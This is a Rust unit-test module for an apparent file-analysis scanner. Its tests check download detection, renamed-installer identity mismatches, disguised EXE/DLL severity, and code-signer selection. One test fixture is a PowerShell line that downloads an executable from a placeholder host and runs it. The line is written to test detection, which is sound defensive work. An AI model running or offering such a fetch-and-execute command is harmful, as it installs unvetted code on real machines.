    use super::*;

    fn limits() -> AnalysisLimits {
        AnalysisLimits {
            entry_max_bytes: 1024 * 1024,
            total_output_max_bytes: 8 * 1024 * 1024,
            max_entries: 100,
            max_depth: 4,
            compression_ratio_warning: 200,
        }
    }

    #[test]
    fn script_findings_are_reported() {
        let analysis = analyze_bytes(
            Path::new("update.ps1"),
            b"Invoke-WebRequest https://example.invalid/a.exe -OutFile a.exe; Start-Process a.exe",
            &limits(),
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "download")
        );
        assert!(
            analysis
                .facts
                .iter()
                .any(|fact| fact.category == "network_endpoint")
        );
    }

    #[test]
    fn renamed_installer_identity_mismatch_is_reported() {
        let product = ProductIdentityEvidence {
            product_name: Some("Microsoft SQL Server 2014".into()),
            manufacturer: Some("Microsoft Corporation".into()),
            original_filename: Some("SqlSetupBootstrapper.exe".into()),
            ..ProductIdentityEvidence::default()
        };
        let mut analysis = ChildAnalysis::default();
        note_product_identity_mismatch(Path::new("ddu-18.1.6.0.exe"), &product, &mut analysis);
        let evidence = analysis
            .facts
            .iter()
            .find(|fact| fact.category == "product_identity")
            .expect("identity mismatch should be reported");
        assert!(evidence.summary.contains("ddu-18.1.6.0.exe"));
        assert!(evidence.summary.contains("SqlSetupBootstrapper.exe"));
        assert!(
            evidence
                .detail
                .as_deref()
                .is_some_and(|detail| { detail.contains("Microsoft SQL Server 2014") })
        );
    }

    #[test]
    fn pe_extension_and_header_type_mismatch_is_high_risk() {
        assert_eq!(
            pe_type_mismatch_severity(Some("dll"), false),
            Some(Severity::High)
        );
        assert_eq!(
            pe_type_mismatch_severity(Some("exe"), true),
            Some(Severity::Medium)
        );
        assert_eq!(
            pe_type_mismatch_severity(Some("dat"), false),
            Some(Severity::High)
        );
        assert_eq!(
            pe_type_mismatch_severity(Some("jpg"), true),
            Some(Severity::High)
        );
        assert_eq!(
            pe_type_mismatch_severity(Some("resources"), false),
            Some(Severity::High)
        );
        assert_eq!(pe_type_mismatch_severity(None, false), Some(Severity::High));
        assert_eq!(pe_type_mismatch_severity(Some("dll"), true), None);
        assert_eq!(pe_type_mismatch_severity(Some("exe"), false), None);
        assert_eq!(pe_type_mismatch_severity(Some("winmd"), true), None);
        assert_eq!(
            pe_type_mismatch_severity(Some("winmd"), false),
            Some(Severity::High)
        );
    }

    #[test]
    fn pe_type_mismatch_summary_names_exe_and_dll_precisely() {
        assert_eq!(
            pe_type_mismatch_summary("loader.dll", Some("dll"), false),
            "loader.dll is an EXE disguised as .dll"
        );
        assert_eq!(
            pe_type_mismatch_summary("metadata.winmd", Some("winmd"), false),
            "metadata.winmd is an EXE disguised as .winmd"
        );
        assert_eq!(
            pe_type_mismatch_summary("library.exe", Some("exe"), true),
            "library.exe is a DLL disguised as .exe"
        );
    }

    #[test]
    fn code_signing_owner_is_preferred_over_timestamp_responder() {
        let candidates = vec![
            ("DigiCert Timestamp Responder".into(), false, true),
            ("Google LLC".into(), true, false),
        ];
        assert_eq!(select_publisher(&candidates).as_deref(), Some("Google LLC"));
    }

    #[test]
    fn product_signer_prefers_the_code_signing_leaf_over_the_root() {
        let candidates = vec![
            SignerCandidate {
                identity: "Sectigo Root".into(),
                sha256: "a".repeat(64),
                code_signing: true,
                time_stamping: false,
                self_signed: true,
                is_ca: true,
                not_before: None,
                not_after: None,
            },
            SignerCandidate {
                identity: "Example Publisher".into(),
                sha256: "b".repeat(64),
                code_signing: true,
                time_stamping: false,
                self_signed: false,
                is_ca: false,
                not_before: None,
                not_after: None,
            },
        ];
        assert_eq!(
            select_signer_candidate(&candidates)
                .expect("signer")
                .identity,
            "Example Publisher"
        );
    }

